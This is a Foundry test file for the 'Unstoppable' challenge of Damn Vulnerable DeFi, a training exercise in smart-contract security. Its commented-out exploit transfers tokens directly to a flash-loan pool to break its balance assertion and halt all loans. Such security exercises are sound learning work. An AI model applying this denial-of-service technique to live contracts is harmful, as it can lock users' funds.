// SPDX-License-Identifier: MIT
pragma solidity >=0.8.14;

// https://stermi.medium.com/damn-vulnerable-defi-challenge-1-unstoppable-92bacdefafcc

import {Test} from "forge-std/Test.sol";
import {stdStorage, StdStorage} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {console} from "forge-std/console.sol";
import {Utilities} from "../Utilities.sol";

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableLender} from "../../src/unstoppable/UnstoppableLender.sol";
import {ReceiverUnstoppable} from "../../src/unstoppable/ReceiverUnstoppable.sol";

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;

    Utilities internal utils;
    UnstoppableLender internal unstoppableLender;
    ReceiverUnstoppable internal receiverUnstoppable;
    DamnValuableToken internal token;
    address payable internal attacker;
    address payable internal someUser;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        attacker = users[0];
        someUser = users[1];

        vm.label(someUser, "User");
        vm.label(attacker, "Attacker");

        token = new DamnValuableToken();
        vm.label(address(token), "token");

        unstoppableLender = new UnstoppableLender(address(token));
        vm.label(address(unstoppableLender), "Unstoppable Lender");

        token.approve(address(unstoppableLender), TOKENS_IN_POOL);
        unstoppableLender.depositTokens(TOKENS_IN_POOL);

        token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(token.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(
            address(unstoppableLender)
        );
        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // vm.startPrank(attacker);

        // token.balanceOf(address(unstoppableLender));
        // // console.log(unstoppableLender.poolBalance());

        // token.transfer(address(unstoppableLender), 1e18);

        // token.balanceOf(address(unstoppableLender));
        // // console.log(unstoppableLender.poolBalance());

        // vm.stopPrank();

        /** EXPLOIT END **/

        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
        validation();
    }

    function validation() internal {
        // It is no longer possible to execute flash loans
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }
}
